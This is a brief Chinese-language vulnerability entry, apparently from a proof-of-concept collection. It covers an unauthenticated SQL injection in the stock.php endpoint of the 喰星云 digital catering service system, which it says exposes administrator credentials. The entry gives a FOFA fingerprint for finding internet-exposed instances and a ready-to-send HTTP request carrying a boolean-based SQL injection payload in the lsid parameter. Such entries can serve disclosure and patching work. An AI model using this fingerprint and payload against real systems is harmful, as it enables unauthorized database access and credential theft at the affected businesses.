## 喰星云-数字化餐饮服务系统stock.php存在SQL注入漏洞

喰星云·数字化餐饮服务系统 stock.php 接口处存在SQL注入漏洞，未经身份验证的远程攻击者可利用此漏洞读取后台管理员账号密码登录凭证信息，导致后台权限被控，造成信息泄露，使系统处于极不安全的状态。

## fofa

```yaml
body="tmp_md5_pwd"
```

## poc

```java
GET /logistics/home_warning/php/stock.php?do=getList&lsid=(SELECT+(CASE+WHEN+(6191=6193)+THEN+%27%27+ELSE+(SELECT+9641+UNION+SELECT+2384)+END)) HTTP/1.1
Host:
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/127.0.0.0 Safari/537.36
```



